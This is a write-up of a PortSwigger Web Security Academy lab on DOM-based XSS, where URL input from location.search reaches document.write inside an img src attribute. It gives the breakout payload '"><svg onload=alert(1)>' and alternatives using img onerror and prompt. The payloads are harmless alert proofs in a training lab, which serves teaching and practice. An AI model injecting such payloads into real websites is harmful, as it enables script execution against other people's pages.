# 🛡️ Lab: DOM-Based XSS in document.write (location.search)

## 📌 Platform
- PortSwigger Web Security Academy

---

## 🎯 Goal
This lab contains a **DOM-based XSS vulnerability**.

👉 Objective:
- Perform a DOM XSS attack  
- Execute `alert()` using data from the URL (`location.search`)  

---

## 🔍 Vulnerability Type
- **DOM-Based XSS**
- Source: `location.search` (URL input)
- Sink: `document.write`

👉 Flow:
```
User Input (URL) → JavaScript → document.write → Executed in Browser
```

---

## 🧠 Key Concept

- The application reads data from the URL (`location.search`)
- It directly writes it into the page using:
```javascript
document.write()
```

❌ No sanitization → leads to XSS

---

## ⚙️ Steps to Solve

### 1. Identify Input Source
- Search functionality uses URL parameter  
- Example:
```
?search=test
```

---

### 2. Inspect the Page
- Right-click → Inspect  
- Observe:
```html
<img src="USER_INPUT">
```

👉 Input is placed inside an **img src attribute**

---

### 3. Break Out of Attribute Context

To inject JavaScript, break out of `src`:

```
"><svg onload=alert(1)>
```

---

### 4. Inject Payload in URL

Final payload:

```
?search="><svg onload=alert(1)>
```

---

### 5. Execute

- Load the modified URL  
- JavaScript executes  

---

## ✅ Result
- `alert(1)` popup appears  
- Lab marked as solved  

---

## 🧠 Explanation

- Input is taken from URL (`location.search`)
- Inserted into DOM using `document.write`
- Injected payload breaks HTML structure
- New element (`svg`) is created
- `onload` event executes JavaScript

---

## 🔄 Alternative Payloads

```html
"><img src=1 onerror=alert(1)>
```

```html
"><svg onload=prompt(1)>
```

---

## ⚠️ Key Learnings

- DOM XSS happens **on client-side (JavaScript)**  
- No server-side reflection needed  
- Always check:
  - `document.write`
  - `innerHTML`
  - `location.search`
  - `document.URL`

- Context matters:
  - Here → inside attribute (`src`)

---

## 🛠️ Payload Summary

```html
"><svg onload=alert(1)>
```

---

## 📌 Conclusion

This lab demonstrates a **DOM-based XSS attack**, where:

1. User input comes from URL (`location.search`)  
2. JavaScript writes it to DOM using `document.write`  
3. No sanitization is applied  
4. Injected payload executes in browser  

---
